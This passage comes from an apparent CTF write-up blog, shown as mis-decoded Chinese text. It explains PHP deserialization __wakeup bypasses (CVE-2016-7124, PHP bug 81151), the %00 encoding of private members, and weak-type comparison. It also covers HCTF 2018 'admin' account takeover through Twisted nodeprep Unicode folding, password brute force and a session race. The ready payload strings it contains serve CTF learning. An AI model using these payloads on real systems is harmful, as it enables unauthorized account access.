<p>åœ¨<code>__destruct</code>å‡½æ•°ä¸­ï¼Œå½“ä¼ å…¥çš„ç”¨æˆ·åä¸º<code>admin</code>ä¼šè¾“å‡º<code>flag</code>ï¼Œä½†æ˜¯åœ¨<code>__wakeup</code>å‡½æ•°ä¸­ï¼Œç”¨æˆ·åè¢«èµ‹å€¼ä¸º<code>guest</code>ã€‚æˆ‘ä»¬çŸ¥é“<code>__wakeup</code>æ˜¯åœ¨ååºåˆ—åŒ–çš„æœ€å¼€å§‹è°ƒç”¨çš„ï¼Œéœ€è¦å»æ‰¾ä¸ªç»•è¿‡æ–¹æ³•ã€‚</p>

        <h2 id="2-ç»•è¿‡-wakeup"   >
          <a href="#2-ç»•è¿‡-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡-wakeup" class="headerlink" title="2.ç»•è¿‡__wakeup"></a>2.ç»•è¿‡<code>__wakeup</code></h2>
      
        <h3 id="1-CVE-2016-7124"   >
          <a href="#1-CVE-2016-7124" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-CVE-2016-7124" class="headerlink" title="(1)CVE-2016-7124"></a>(1)CVE-2016-7124</h3>
      <p>æ»¡è¶³å¦‚ä¸‹æ¡ä»¶</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></div></figure>

<p>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œæˆå‘˜ä¸ªæ•°çš„å€¼å¤§äºå®é™…æˆå‘˜ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡<code>__wakeup</code>å‡½æ•°çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä½¿å¾—ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æˆå‘˜ä¸ªæ•°å¤§äºå®é™…çš„æˆå‘˜ä¸ªæ•°ã€‚å¦‚ä¸‹ï¼Œå°†<code>Name</code>è¿™ä¸ªå¯¹è±¡å¯¹åº”çš„æˆå‘˜ä¸ªæ•°ç”±åŸæœ¬çš„2æ”¹ä¸º3å³å¯ç»•è¿‡ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://paper.seebug.org/866/#php_2" >PHP å†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´ (seebug.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="2-å°æŠ€å·§"   >
          <a href="#2-å°æŠ€å·§" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å°æŠ€å·§" class="headerlink" title="(2)å°æŠ€å·§"></a>(2)å°æŠ€å·§</h3>
      <p>å¯¹äºå®é™…æ·»åŠ æˆå‘˜çš„å±æ€§ä¹Ÿèƒ½ä»ä¸€ç§ç¨‹åº¦ä¸Šç»•è¿‡<code>__wakeup</code>ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        print_r(<span class="string">&quot;calling __toString\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        print_r(<span class="string">&quot;calling __wakeup\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$myStr</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line">print_r(<span class="variable">$myStr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$objStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;s:1:&quot;n&quot;:N;&#125;&#x27;;</span></span><br><span class="line"><span class="comment">//$originStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;&#125;&#x27;;</span></span><br><span class="line"><span class="comment">//unserialize($objStr);</span></span><br><span class="line"><span class="comment">//echo &quot;aa&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>å…ˆç”Ÿæˆä¸€ä¸‹åºåˆ—åŒ–é“¾å­ï¼Œå¾—åˆ°<code>$originStr</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$originStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;&#125;&#x27;;</span><br><span class="line">//æ·»åŠ ä¸€ä¸ªå±æ€§ `s:1:&quot;n&quot;:N;`å¾—åˆ°å¦‚ä¸‹$objStr</span><br><span class="line">$objStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;s:1:&quot;n&quot;:N;&#125;&#x27;;</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œå‘ç°å…ˆ<code>__toString</code>ï¼Œå†è°ƒç”¨<code>__wakeup</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize($objStr);</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·ä¹Ÿä»£è¡¨ä»å¦ä¸€ç§æ–¹å¼ç»•è¿‡<code>__wakeup</code>å‡½æ•°äº†ã€‚</p>
<p>æ­¤å¤–æ›¿æ¢<code>s:1:&quot;n&quot;:N;</code>ä¸º<code>;</code>å…¶å®ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨<code>php8</code>ç‰ˆæœ¬ä¸‹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æŸä¸ª<code>CVE</code>ï¼Œ</p>

        <h3 id="3-php-bug"   >
          <a href="#3-php-bug" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-php-bug" class="headerlink" title="(3)php_bug"></a>(3)php_bug</h3>
      <p>é¢˜ç›®è§ï¼š<strong>Sekai Game Start</strong></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151" >PHP :: Bug #81151 :: bypass __wakeup</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span>  </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;wake up&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨<code>php8.0</code>ä¹Ÿå¯ä»¥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221004155126882.png" alt="image-20221004155126882"></p>

        <h2 id="3-privateæˆå‘˜"   >
          <a href="#3-privateæˆå‘˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-privateæˆå‘˜" class="headerlink" title="3.privateæˆå‘˜"></a>3.privateæˆå‘˜</h2>
      <p>åºåˆ—åŒ–æ—¶</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cookie</span> = <span class="string">&#x27;cookie&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$cookie</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie = <span class="variable">$cookie</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>,<span class="string">&quot;cookie&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä¸åŒç±»å‹çš„æˆå‘˜åºåˆ—åŒ–ä¹‹åæˆå‘˜å˜é‡åä¿å­˜çš„å½¢å¼ä¸å¤ªä¸€æ ·</p>
<ul>
<li><p>private</p>
<p>å˜ä¸º<code>\x00className\x00memberName</code></p>
</li>
<li><p>public</p>
<p>ä»ç„¶ä¸ºåŸå§‹çš„ï¼Œå³<code>username</code></p>
</li>
<li><p>protected</p>
<p>å˜ä¸º<code>\x00*\x00memberName</code></p>
</li>
</ul>
<p>æ‰€ä»¥åœ¨ä¼ å…¥ååºåˆ—å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦è€ƒè™‘åˆ°è¿™äº›ç‰¹ç‚¹ï¼Œè¿™é‡Œå¯¹åº”<code>private</code>æˆå‘˜å°±éœ€è¦ä¼ å…¥<code>URL</code>ç¼–ç çš„<code>\x00</code>å³<code>%00</code></p>

        <h2 id="4-æœ€ç»ˆpayload"   >
          <a href="#4-æœ€ç»ˆpayload" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æœ€ç»ˆpayload" class="headerlink" title="4.æœ€ç»ˆpayload"></a>4.æœ€ç»ˆpayload</h2>
      <p>ä¿®æ”¹æˆå‘˜æ•°é‡ç»•è¿‡<code>__wakeup</code>ï¼ŒåŠ å…¥<code>%00</code>è¡¨ç¤º<code>private</code>æˆå‘˜</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="åä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile"   >
          <a href="#åä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="åä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>åä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1>
      
        <h2 id="ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½"   >
          <a href="#ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½" class="headerlink" title="ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½"></a>ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½</h2>
      <p>é¦–å…ˆè·å–å¤‡ä»½æºç <code>url/index.php.bak</code>ï¼Œæ‰«ä¸€ä¸‹ä¹Ÿå¯ä»¥</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>çœ‹åˆ°å½“ä¼ å…¥çš„<code>key</code>ç­‰äº<code>str</code>æ—¶ä¼šæ‰“å°<code>flag</code>ï¼Œä½†æ˜¯åˆä¸èƒ½ä¼ å­—ç¬¦ï¼Œè¿™é‡Œå°±ç”¨åˆ°å¼±ç±»å‹æ¯”è¾ƒ</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="number">123</span>;</span><br><span class="line"><span class="variable">$abc</span> = <span class="string">&quot;123aaaa&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$abc</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä¸Šè¿°ä»£ç ä¼šè¾“å‡º<code>bbbb</code>ï¼ŒåŸå› å°±æ˜¯å½“<code>==</code>æ¯”è¾ƒå¯¹è±¡ä¸­ä»»æ„ä¸€ä¸ªä¸ºæ•°å­—ï¼Œå°±ä¼šæŠŠå¦ä¸€ä¸ªæ¯”è¾ƒå¯¹è±¡ä¹Ÿå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ï¼Œå¯¹äºå­—ç¬¦ä¸²å‹çš„å¼ºåˆ¶è½¬æ¢ï¼Œä¼šä»å·¦å¼€å§‹éå†ï¼Œç›´åˆ°ç¢°åˆ°éæ•°å­—çš„éƒ¨åˆ†ï¼Œä¸¢å¼ƒä¹‹åçš„éƒ¨åˆ†ï¼Œè½¬æ¢ä¸ºæ•°å­—ï¼Œæ‰€ä»¥æ¡ä»¶æˆç«‹ã€‚</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$abc</span> = <span class="string">&quot;123aaaa333&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></div></figure>

<p>ä¸Šè¿°ä»£ç ä¼šè¾“å‡º<code>123</code>ï¼Œ</p>
<p>é‚£ä¹ˆä¼ å…¥<code>key=123</code>å³å¯ã€‚</p>

        <h1 id="åå…«ã€-HCTF-2018-admin"   >
          <a href="#åå…«ã€-HCTF-2018-admin" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå…«ã€-HCTF-2018-admin" class="headerlink" title="åå…«ã€[HCTF 2018]admin"></a>åå…«ã€[HCTF 2018]admin</h1>
      
        <h2 id="ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€"   >
          <a href="#ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€" class="headerlink" title="ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€"></a>ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086#h3-6" >ä¸€é¢˜ä¸‰è§£ä¹‹2018HCTF&amp;admin - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æç¤º<code>admin</code>ï¼Œæœ‰ç™»å½•æ³¨å†Œç•Œé¢ï¼Œæ³¨å†Œç•Œé¢æ³¨å†Œ<code>admin</code>å¤±è´¥ï¼Œåº”è¯¥æœ‰è¯¥ç”¨æˆ·ã€‚é‚£ä¹ˆç›´æ¥å°è¯•<code>Burpsuite</code>å¼±å¯†ç çˆ†ç ´ã€‚BUUå¹³å°å‘åŒ…éœ€è¦æ…¢ä¸€ç‚¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220711121051309.png" alt="image-20220711121051309"></p>
<p>çˆ†å‡ºæ¥123ï¼Œç™»å½•å¾—<code>flag</code>ã€‚è¿™ä¸ç®—ä»€ä¹ˆè§£æ³•ï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚</p>

        <h2 id="1-è§£æ³•ä¸€"   >
          <a href="#1-è§£æ³•ä¸€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è§£æ³•ä¸€" class="headerlink" title="1.è§£æ³•ä¸€"></a>1.è§£æ³•ä¸€</h2>
      <p><code>python</code>çš„<code>flask</code>æ¨¡æ¿åº“<code>Twisted</code>ä¸­çš„å‡½æ•°é—®é¢˜</p>
<p>åœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢æºä»£ç æœ‰æç¤ºï¼Œè¯¥ç½‘ç«™ä½¿ç”¨çš„ä¸º<code>python</code>çš„<code>flash</code>æ¨¡æ¿ï¼Œç»™äº†ç›¸å…³ç½‘å€ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask" >woadsl1234/hctf_flask: hctf_flask (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œå…¶ä¸­çš„å„ä¸ªåŒ…ç‰ˆæœ¬</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220712144242517.png" alt="image-20220712144242517"></p>
<ul>
<li><p>æŸ¥æ‰¾<code>flask</code>çš„è·¯ç”±<code>routes.py</code>ï¼Œæ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹å¯†ç çš„ç›¸å…³å‡½æ•°ï¼Œä½¿ç”¨çš„éƒ½æ˜¯<code>strlower</code>å‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></div></figure>

<p>æ¥å°†ç”¨æˆ·åè¿›è¡Œå°å†™åŒ–ï¼Œè€Œ<code>nodeprep</code>ä½äºåŒ…<code>Twisted==10.2.0</code></p>
</li>
<li><p>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„åŒ…ï¼Œè·Ÿè¿›æŸ¥çœ‹å‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nodeprep = Profile(mappings=[B_1, B_2],</span><br><span class="line">                   prohibiteds=[C_11, C_12, C_21, C_22,</span><br><span class="line">                                C_3, C_4, C_5, C_6, C_7, C_8, C_9,</span><br><span class="line">                                LookupTable([<span class="string">u&#x27;&quot;&#x27;</span>, <span class="string">u&#x27;&amp;&#x27;</span>, <span class="string">u&quot;&#x27;&quot;</span>, <span class="string">u&#x27;/&#x27;</span>,</span><br><span class="line">                                             <span class="string">u&#x27;:&#x27;</span>, <span class="string">u&#x27;&lt;&#x27;</span>, <span class="string">u&#x27;&gt;&#x27;</span>, <span class="string">u&#x27;@&#x27;</span>])])</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç›¸å…³çš„<code>unicode</code>ç¼–ç ï¼Œç›¸å…³ç¼–ç å¯æŸ¥ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://unicode-table.com/en/blocks/" >Unicode - Unicode Character Table (unicode-table.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>åˆ¶å®šäº†ç›¸å…³è¡¨æ ¼ç´¢å¼•ï¼Œä¸çŸ¥é“æ˜¯æ€ä¹ˆåˆ¶å®šçš„ï¼Œåº”è¯¥æ˜¯å­—å…¸å•¥çš„æŠŠï¼Œæ¯”å¦‚ç»è¿‡<code>nodeprep.prepare</code>ä¹‹å</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u&#x27;\u0041&#x27;  ----&gt;   u&#x27;\u0061&#x27;</span><br><span class="line">A          ----&gt;   a</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡åœ¨è¯¥é¢˜çš„ç‰ˆæœ¬ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>Twisted==10.2.0</code>ï¼Œå…¶å†…éƒ¨ä»£ç å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u&#x27;\u1d2c&#x27;  ----&gt;   u&#x27;\u0041&#x27;</span><br><span class="line">á´¬          ----&gt;   A</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´å¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlower(&#x27;á´¬&#x27;)=A</span><br><span class="line">strlower(&#x27;A&#x27;)=a</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ç°åœ¨æœ€æ–°ç‰ˆæœ¬çš„<code>Twisted</code>å·²ç»æ²¡äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
</li>
<li><p>ä¾æ®è¿™æ ·ï¼Œæ³¨å†Œçš„æ—¶å€™ä½¿ç”¨<code>á´¬dmin</code>ï¼Œå˜æˆäº†ç”¨æˆ·<code>Admin</code>ã€‚ç„¶åç™»å½•<code>Admin</code>ï¼Œä¿®æ”¹å¯†ç ï¼Œå˜æˆäº†ä¿®æ”¹<code>admin</code>çš„å¯†ç ï¼Œå³å¯å¾—åˆ°<code>admin</code>è´¦æˆ·ã€‚</p>
</li>
</ul>

        <h2 id="2-è§£æ³•äºŒ"   >
          <a href="#2-è§£æ³•äºŒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£æ³•äºŒ" class="headerlink" title="2.è§£æ³•äºŒ"></a>2.è§£æ³•äºŒ</h2>
      <p>åˆ©ç”¨<code>flask</code>æ¨¡æ¿å­˜åœ¨äºå®¢æˆ·ç«¯çš„ç¼ºé™·ï¼Œä¼ªé€ <code>session</code>ï¼Œç‰ˆæœ¬å®‰è£…è€å¤±è´¥ï¼Œæ”¾å¼ƒ</p>

        <h2 id="3-è§£æ³•ä¸‰"   >
          <a href="#3-è§£æ³•ä¸‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è§£æ³•ä¸‰" class="headerlink" title="3.è§£æ³•ä¸‰"></a>3.è§£æ³•ä¸‰</h2>
      <p>æ¡ä»¶ç«äº‰ï¼Œå°±æ˜¯åœ¨æ”¹å¯†ç çš„æ—¶å€™ä¸­æ–­ï¼Œç„¶ååˆ©ç”¨ç™»å½•åŠŸèƒ½ï¼Œå°è¯•ç™»å½•<code>admin</code>ï¼Œå°†å½“å‰çš„<code>session[&#39;name&#39;]</code>æ”¹ä¸º<code>admin</code>ï¼Œä¹‹åå†å›åˆ°æ”¹å¯†ç çš„åœ°æ–¹ï¼Œå°†<code>admin</code>çš„å¯†ç æ”¹æ‰ã€‚</p>
